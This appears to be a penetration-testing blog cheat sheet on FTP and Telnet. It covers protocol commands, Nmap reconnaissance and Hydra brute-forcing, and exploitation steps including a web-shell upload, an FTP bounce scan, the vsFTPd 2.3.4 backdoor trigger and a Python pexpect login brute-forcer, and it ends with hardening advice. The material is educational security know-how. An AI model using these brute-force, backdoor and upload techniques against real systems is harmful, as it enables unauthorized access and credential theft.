---
title: "FTP & Telnet Cheatsheet"
date: 2025-02-19 12:00:00 +0800
categories: [Networking, Security]
tags: [FTP, Telnet, Cheat Sheet, Pentesting]
author: 0xReDrag0n
author_bio: "Security researcher and penetration tester specializing in network exploitation."
image:
  path: "v0/b/xredrag0n.appspot.com/o/Attachment-Posts%2FPost-2025-02-19-ftp-telnet-cheatsheet%2F2025-02-19-ftp-telnet-cheatsheet.png?alt=media&token=127ec563-33c3-410e-b4d0-13880f81a31f"
seo:
  title: "FTP & Telnet Cheatsheet"
  description: "A comprehensive FTP & Telnet cheat sheet covering commands, recon techniques, and exploitation methods for penetration testers."
  keywords: "FTP, Telnet, Penetration Testing, Ethical Hacking, Security, Exploitation"
published: true
---

{% include pageviews.html %}

# **FTP & Telnet Cheat Sheet**

## **1. FTP Basics**

### **FTP Overview**
- **Protocol**: File Transfer Protocol (FTP)
- **Default Port**: 21
- **Channels**:
  - **Command Channel**: Used for issuing commands.
  - **Data Channel**: Used for transferring files.
- **Common Tools**: `nmap`, `hydra`, `pexpect`, `ftp`

### **VSFTPD & ProFTPD**
- **VSFTPD (Very Secure FTP Daemon)**: A fast, stable, and secure FTP server for Unix-like systems (Linux, BSD, etc.).
- **ProFTPD (Professional FTP Daemon)**: An open-source FTP server designed for flexibility, ease of configuration, and advanced security features.

### **Connecting to an FTP Server**
```bash
ftp <hostname_or_IP>      # Connect to the FTP server
USER <username>           # Provide username
PASS <password>           # Provide password
QUIT                      # Exit FTP session
```

### **Directory & File Operations**
```bash
PWD                       # Show current directory
CWD /path/to/directory    # Change working directory
CDUP                      # Move up one directory level
LIST                      # List files in the directory (detailed)
NLST                      # List filenames only
MKD newdir                # Create a new directory
RMD olddir                # Remove a directory
DELE file.txt             # Delete a file
RNFR old.txt              # Rename a file (step 1: specify old name)
RNTO new.txt              # Rename a file (step 2: specify new name)
SIZE file.txt             # Get file size
MDTM file.txt             # Get last modified time of a file
```

### **Downloading & Uploading Files**
```bash
RETR file.txt             # Download (Retrieve) a file
STOR file.txt             # Upload (Store) a file
STOU file.txt             # Upload a unique file
APPE file.txt             # Append data to an existing file
REST 1000                 # Resume file transfer from byte 1000
ABOR                      # Abort file transfer
MGET                      # Download multiple files
MPUT                      # Upload multiple files
```

### **Transfer Modes**
- `TYPE A` → ASCII mode (for text files)  
- `TYPE I` → Binary mode (for non-text files, like images or executables)

### **Connection Modes**
- **Active Mode (A)**: The server initiates the data connection to the client.
  - `PORT <ip1>,<ip2>,<ip3>,<ip4>,<port1>,<port2>`  # Switch to active mode
- **Passive Mode (P)**: The client initiates the data connection to the server.
  - `PASV` → Switch to Passive Mode (preferred for firewalls/NAT)

### **Additional Commands**
```bash
HELP                      # Show available commands
SITE HELP                 # Show site-specific commands
FEAT                      # List available features
OPTS UTF8 ON              # Enable UTF-8 encoding
AUTH TLS                  # Start TLS authentication
PBSZ 0                    # Set protection buffer size
PROT P                    # Enable data encryption
PROT C                    # Disable data encryption
ALLO 8192                 # Allocate space for file transfer
SITE CHMOD 755 file.txt   # Change file permissions
SITE QUOTA                # Check user quota
NOOP                      # No operation (server should respond)
STATUS                    # Display FTP connection status
```

---

## **2. Telnet Overview**

### **Telnet Protocol**
- **Telnet** is an application-layer protocol used for remote access to a terminal.
- It operates on port **23** by default.
- **Security Warning**: Telnet transmits credentials in plaintext, making it insecure. Use **SSH** for secure connections.

### **Example Telnet Session**
```bash
telnet <server_ip>
Trying <server_ip>...
Connected to <server_ip>.
Login: <username>
Password: <password>
```

### **Using Telnet with HTTP**
To manually request a file from a web server:
```bash
telnet <server_ip> 80
GET /index.html HTTP/1.1
Host: example.com
```

### **Using Telnet with FTP**
Telnet can also interact with FTP servers directly:
```bash
telnet <server_ip> 21
USER <username>
PASS <password>
SYST             # Get system type
PASV             # Switch to passive mode
PORT x,x,x,x,y,y # Switch to active mode
TYPE A           # Set ASCII mode
TYPE I           # Set Binary mode
STAT             # Get server status
QUIT             # Exit FTP session
```

---

## **3. Reconnaissance**

### **Nmap Scanning**
1. **Basic Scan**:
   ```bash
   nmap <TARGET_IP>
   ```
2. **Service Version Detection**:
   ```bash
   nmap -p21 -sV -O <TARGET_IP>
   ```
3. **Anonymous Login Check**:
   ```bash
   nmap --script ftp-anon -p21 <TARGET_IP>
   ```

### **Hydra Brute-Force**
4. **Brute-Force Credentials**:
   ```bash
   hydra -L <USER_LIST> -P <PASSWORD_LIST> <TARGET_IP> ftp
   ```
   Example:
   ```bash
   hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
         -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
         192.217.238.3 ftp
   ```

5. **Single User Brute-Force**:
   ```bash
   echo "username" > users
   hydra -l username -P <PASSWORD_LIST> <TARGET_IP> ftp
   ```

### **Nmap Scripts**
6. **Brute-Force with Nmap**:
   ```bash
   nmap --script ftp-brute --script-args userdb=<USER_FILE>,passdb=<PASSWORD_FILE> -p21 <TARGET_IP>
   ```
   Example:
   ```bash
   echo "sysadmin" > users
   nmap --script ftp-brute --script-args userdb=/root/users -p21 192.217.238.3
   ```

7. **Anonymous Login Script**:
   ```bash
   nmap --script ftp-anon -p21 <TARGET_IP>
   ```

---

## **4. Exploitation**

### **Common FTP Vulnerabilities**
- **Anonymous Access**: Some FTP servers allow login without credentials.
- **Default Credentials**: Many FTP servers use weak/default credentials.
- **Misconfigured Write Permissions**: Allows uploading malicious files.
- **Brute-Force Attacks**: Weak passwords can be cracked.
- **Cleartext Traffic**: Credentials are transmitted in plaintext.

### **Exploitation Techniques**

#### **1. Test Anonymous Login**
```bash
USER anonymous
PASS anonymous
```

#### **2. Attempt Default Credentials**
Try common credentials:
- `admin:admin`
- `ftp:ftp`
- `root:toor`
- `anonymous:anonymous`

#### **3. Check for Write Permissions**
If you can upload files:
```bash
PUT shell.php
```
Access via browser: `http://<target>/shell.php`.

#### **4. FTP Bounce Attack**
If PORT mode is allowed:
```bash
PORT 192,168,1,100,7,7
LIST
```
This can be used to scan internal networks.

#### **5. vsFTPd 2.3.4 Backdoor (CVE-2011-2523)**
If the banner shows `vsFTPd 2.3.4`:
```bash
USER backdoor:)
PASS anything
```
This opens a reverse shell on port **6200**.

#### **6. Brute-Force FTP Credentials**
Use Hydra:
```bash
hydra -l admin -P rockyou.txt ftp://<target_ip>
```

#### **7. MITM Attack**
Sniff cleartext traffic:
```bash
tcpdump -i eth0 port 21 -A
```

#### **8. Metasploit Modules**
```bash
use auxiliary/scanner/ftp/anonymous
set RHOSTS <target_ip>
run

use auxiliary/scanner/ftp/ftp_login
set RHOSTS <target_ip>
set USERNAME admin
set PASSWORD admin
run
```

---

## **5. Security Recommendations**
- **Disable Anonymous FTP Access**: Restrict unauthorized access.
- **Use Strong Credentials**: Avoid default or weak passwords.
- **Enable Encryption**: Use **FTPS (TLS)** or **SFTP (SSH)** instead of plain FTP.
- **Restrict Access with Firewalls**: Limit who can connect to the FTP server.
- **Monitor Logs**: Regularly check for suspicious activity.

---

## **6. Additional Notes**
- **ASCII vs Binary Mode**: Always set the correct transfer mode (`TYPE A` for text files, `TYPE I` for binary files).
- **Passive vs Active Mode**: Prefer Passive Mode (`PASV`) when dealing with firewalls or NAT.
- **Hidden Files**: Use `ls -a` to list hidden files if using an FTP client.
- **Pro Tip**: Look for misconfigured write permissions or sensitive files that may lead to privilege escalation.

---

## **7. Commands Summary**

| Task                      | Command                                                                     |
| ------------------------- | --------------------------------------------------------------------------- |
| Basic Nmap Scan           | `nmap <TARGET_IP>`                                                          |
| Service Version Detection | `nmap -p21 -sV -O <TARGET_IP>`                                              |
| Anonymous Login Check     | `nmap --script ftp-anon -p21 <TARGET_IP>`                                   |
| Hydra Brute-Force         | `hydra -L <USER_LIST> -P <PASSWORD_LIST> <TARGET_IP> ftp`                   |
| Nmap Brute-Force          | `nmap --script ftp-brute --script-args userdb=<USER_FILE> -p21 <TARGET_IP>` |
| FTP Login                 | `ftp <TARGET_IP>`                                                           |
| List Files                | `ftp> ls`                                                                   |
| Download File             | `ftp> get <FILENAME>`                                                       |

---

## **8. Custom Python Script for Brute-Force**

```python
import pexpect
import sys

username = sys.argv[2]
password_dict = sys.argv[3]

# Load password dictionary
lines = [line.rstrip('\n') for line in open(password_dict)]

for password in lines:
    child = pexpect.spawn(f'ftp {sys.argv[1]}')
    child.expect('Name .*:')
    child.sendline(username)
    child.expect('Password:')
    child.sendline(password)
    i = child.expect(['Login successful', 'Login failed'])
    if i == 0:
        print(f"Login Successful with {password}")
        break
    else:
        child.kill(0)
```

### **Run Script**
```bash
python script.py <TARGET_IP> <USERNAME> <PASSWORD_LIST>
```

---

💡 **Pro Tip**: If you gain FTP access, try checking for **hidden files** (`ls -a`) or **misconfigured write permissions** (attempt to upload a file). 🚀

- **FTP is insecure by design!** Always prefer **SFTP (SSH-based)** or **FTPS (TLS-encrypted).** 🚀

{% include comments.html %}
{% include analytics.html %}
